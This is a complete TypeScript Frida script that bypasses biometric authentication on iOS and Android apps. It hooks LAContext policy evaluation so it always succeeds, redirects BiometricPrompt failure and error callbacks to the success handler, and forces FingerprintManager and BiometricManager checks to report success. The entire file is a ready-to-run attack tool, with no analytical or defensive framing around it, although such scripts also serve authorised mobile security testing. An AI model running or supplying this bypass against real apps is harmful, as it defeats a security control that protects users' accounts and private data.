/**
 * biometric_bypass.ts — biometric authentication bypass
 *
 * iOS:     hooks LAContext.evaluatePolicy(_:localizedReason:reply:) → always
 *          invokes the reply block with success=true, error=nil.
 * Android: hooks BiometricPrompt.AuthenticationCallback.onAuthenticationSucceeded,
 *          FingerprintManager, and BiometricManager to force success.
 */

"use strict";

function emitBypass(target: string, method: string, extra?: Record<string, unknown>): void {
    send(JSON.stringify({
        type:     "hook_event",
        hook:     "biometric_bypass",
        target,
        method,
        severity: "critical",
        ts:       Date.now() / 1000,
        ...(extra ?? {}),
    }));
}

// ── iOS LAContext ─────────────────────────────────────────────────────────────

if (typeof ObjC !== "undefined" && ObjC.available) {
    try {
        const LAContext = ObjC.classes["LAContext"];
        if (LAContext) {
            // evaluatePolicy:localizedReason:reply:
            const evalPolicy = LAContext["- evaluatePolicy:localizedReason:reply:"];
            if (evalPolicy) {
                evalPolicy.implementation = ObjC.implement(evalPolicy, function (
                    self: ObjC.Object,
                    _sel: NativePointer,
                    _policy: number,
                    _reason: ObjC.Object,
                    replyBlock: ObjC.Object
                ) {
                    emitBypass("iOS", "LAContext.evaluatePolicy");
                    // Invoke the reply block with (YES, nil)
                    const block = new ObjC.Block(replyBlock);
                    block.implementation(1, ptr(0)); // success=YES, error=nil
                    return self;
                });
            }

            // canEvaluatePolicy:error: — always return YES
            const canEval = LAContext["- canEvaluatePolicy:error:"];
            if (canEval) {
                canEval.implementation = ObjC.implement(canEval, function (
                    self: ObjC.Object,
                    _sel: NativePointer,
                    _policy: number,
                    errorPtr: NativePointer
                ) {
                    emitBypass("iOS", "LAContext.canEvaluatePolicy");
                    if (!errorPtr.isNull()) errorPtr.writePointer(ptr(0));
                    return self; // truthy ObjC object = YES
                });
            }
        }
    } catch {
        // LAContext not available in this process
    }
}

// ── Android Biometric ─────────────────────────────────────────────────────────

if (typeof Java !== "undefined" && Java.available) {
    Java.perform(() => {

        // BiometricPrompt.AuthenticationCallback — force onAuthenticationSucceeded
        try {
            const AuthCallback = Java.use(
                "android.hardware.biometrics.BiometricPrompt$AuthenticationCallback"
            );
            // Patch onAuthenticationFailed → redirect to onAuthenticationSucceeded
            AuthCallback.onAuthenticationFailed.implementation = function () {
                emitBypass("Android", "BiometricPrompt.AuthenticationCallback.onAuthenticationFailed → succeeded");
                this.onAuthenticationSucceeded(null);
            };
            AuthCallback.onAuthenticationError.implementation = function (
                _errCode: number, _errString: unknown
            ) {
                emitBypass("Android", "BiometricPrompt.AuthenticationCallback.onAuthenticationError → succeeded");
                this.onAuthenticationSucceeded(null);
            };
        } catch { /* SDK-level class not present */ }

        // androidx.biometric.BiometricPrompt
        try {
            const AndroidXCallback = Java.use(
                "androidx.biometric.BiometricPrompt$AuthenticationCallback"
            );
            AndroidXCallback.onAuthenticationFailed.implementation = function () {
                emitBypass("Android", "androidx.BiometricPrompt.AuthenticationCallback.onAuthenticationFailed → succeeded");
                this.onAuthenticationSucceeded(null);
            };
            AndroidXCallback.onAuthenticationError.implementation = function (
                _errCode: number, _errString: unknown
            ) {
                emitBypass("Android", "androidx.BiometricPrompt.AuthenticationCallback.onAuthenticationError → succeeded");
                this.onAuthenticationSucceeded(null);
            };
        } catch { /* androidx not present */ }

        // Legacy FingerprintManager
        try {
            const FpManager = Java.use("android.hardware.fingerprint.FingerprintManager");
            FpManager.isHardwareDetected.implementation = function () {
                emitBypass("Android", "FingerprintManager.isHardwareDetected → true");
                return true;
            };
            FpManager.hasEnrolledFingerprints.implementation = function () {
                emitBypass("Android", "FingerprintManager.hasEnrolledFingerprints → true");
                return true;
            };
        } catch { /* skip */ }

        // BiometricManager.canAuthenticate — return BIOMETRIC_SUCCESS (0)
        try {
            const BiometricManager = Java.use("android.hardware.biometrics.BiometricManager");
            BiometricManager.canAuthenticate.overloads.forEach((ov: {
                implementation: (...args: unknown[]) => number
            }) => {
                ov.implementation = function (..._args: unknown[]) {
                    emitBypass("Android", "BiometricManager.canAuthenticate → BIOMETRIC_SUCCESS");
                    return 0; // BIOMETRIC_SUCCESS
                };
            });
        } catch { /* skip */ }

    });
}

send(JSON.stringify({ type: "hook_event", hook: "biometric_bypass_ready", ts: Date.now() / 1000 }));
